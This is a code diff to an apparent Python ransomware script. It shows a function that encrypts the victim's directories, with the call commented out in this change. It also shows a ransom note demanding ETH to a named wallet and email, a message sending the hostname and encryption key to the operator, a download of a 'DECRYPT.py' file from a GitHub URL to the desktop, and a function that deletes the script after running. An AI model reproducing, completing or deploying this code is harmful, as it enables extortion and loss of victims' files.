@@ -13,8 +13,17 @@ from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 import shutil
 import math
+import requests
+from pathlib import Path
+import sys
 
-
+def delete_script():
+    script_path = os.path.abspath(sys.argv[0])
+    try:
+        os.remove(script_path)
+        print(f"Script '{script_path}' deleted successfully.")
+    except Exception as e:
+        print(f"Error deleting script: {e}")
 
 hostname = socket.gethostname()
 IPAddr = socket.gethostbyname(hostname)
@@ -25,7 +34,25 @@ number_of_encrypts = 0
 hostname = socket.gethostname()
 IPAddr = socket.gethostbyname(hostname)
 
-
+def download_file(url, filename):
+    try:
+        # Send an HTTP GET request to the URL
+        response = requests.get(url)
+        response.raise_for_status()  # Raise an exception for 4XX and 5XX status codes
+        
+        # Get the user's desktop directory
+        desktop_path = Path.home() / "Desktop"
+        
+        # Construct the full file path
+        file_path = desktop_path / filename
+        
+        # Save the content of the response to the file
+        with open(file_path, 'wb') as f:
+            f.write(response.content)
+        
+        print(f"File downloaded successfully to {file_path}")
+    except requests.exceptions.RequestException as e:
+        print("Error downloading the file:", e)
 
 def get_folder_size(folder_path):
     # Function to calculate the total size of a folder and its subfolders
@@ -206,7 +233,7 @@ def encrypt_files():
         folder_size = get_folder_size(folder_path)
         encryption_size = get_encryption_size(directories=directories)
         send_message(f"Attempting to encrypt '{folder_name}' directory with a total size of '{folder_size}'")
-        encrypt_folder(folder_path=folder_path, key=str(encryption_key))
+        #encrypt_folder(folder_path=folder_path, key=str(encryption_key))
    eth_amount = (f"0.0{random.randint(6,8)}ETH")
    day_amount = (f"{random.randint(2,4)}")
    crypto_wallet = r"0xA8751bcE4ca787CE8d630727F048592dD03B9A5A"
@@ -214,8 +241,10 @@ def encrypt_files():
    content = f"Uh Oh, about {encryption_size} of your important files have been encrypted! Dont panic you can retrive your files by sending {eth_amount} to this wallet - '{crypto_wallet}' after send an email to 'encouraging_sloth_8202@posteo.com', you have {day_amount} days to send the ETH or your files will be gone forever"
    send_message(f"files on computer {hostname}, have been encrypted with a total size of {encryption_size} with the key .'  {encryption_key}  '., the user must pay {eth_amount} within {day_amount} days.")
    create_text_file_on_desktop(file_name, content)
+   url = r"https://raw.githubusercontent.com/Lixvinity/winjv/main/decrypt.py"
+   download_file(url, filename="DECRYPT.py")
 encrypt_files()
-
+delete_script()
 
 
 
